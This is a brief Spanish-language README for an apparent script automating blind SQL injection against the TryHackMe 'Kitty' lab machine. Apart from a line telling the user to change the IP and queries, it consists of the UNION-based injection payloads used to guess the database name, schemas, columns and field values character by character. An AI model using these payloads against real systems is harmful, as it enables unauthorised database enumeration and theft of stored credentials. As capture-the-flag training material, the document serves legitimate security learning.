# Sqli_KittyTHM
Script de automatizacion de maquina kitty de tryhackme
Modificar ip y querys dependiendo lo que se vaya a enumerar
Querys que use
' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY 'a%' -- -
' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata WHERE schema_name LIKE 'a%' -- -
' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema = '{nombre}' and table_name = '{nombre}' and column_name LIKE 'ui%' -- -
' UNION SELECT 1, {nombre}, 3, 4 FROM {nombre}.{nombre} WHERE {nombre} LIKE 'l%' -- -
